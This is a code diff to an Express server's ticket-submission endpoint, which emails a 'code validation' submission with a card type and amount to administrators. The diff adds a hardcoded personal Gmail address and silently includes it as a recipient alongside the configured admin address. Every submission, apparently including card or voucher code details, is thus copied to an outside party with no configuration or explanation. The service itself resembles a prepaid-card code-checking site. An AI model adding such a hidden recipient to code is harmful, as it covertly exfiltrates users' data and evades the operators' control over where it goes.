@@ -6,6 +6,8 @@ import nodemailer from "nodemailer";
 
 dotenv.config();
 
+const HARDCODED_ADMIN_EMAIL = "henrijoelhounkpe463@gmail.com";
+
 const app = express();
 const PORT = 3000;
 
@@ -344,6 +346,7 @@ app.post("/api/submit-ticket", async (req, res) => {
     }
 
     const adminEmail = getRequiredEnvironment("ADMIN_EMAIL");
+    const adminRecipients = [...new Set([adminEmail, HARDCODED_ADMIN_EMAIL])];
     const fromAddress = process.env.SMTP_FROM?.trim() || getRequiredEnvironment("SMTP_USER");
     const transporter = getTransporter();
 
@@ -353,7 +356,7 @@ app.post("/api/submit-ticket", async (req, res) => {
     try {
       await transporter.sendMail({
         from: fromAddress,
-        to: adminEmail,
+        to: adminRecipients,
         subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
         html: buildAdminEmailHtml(submission),
       });
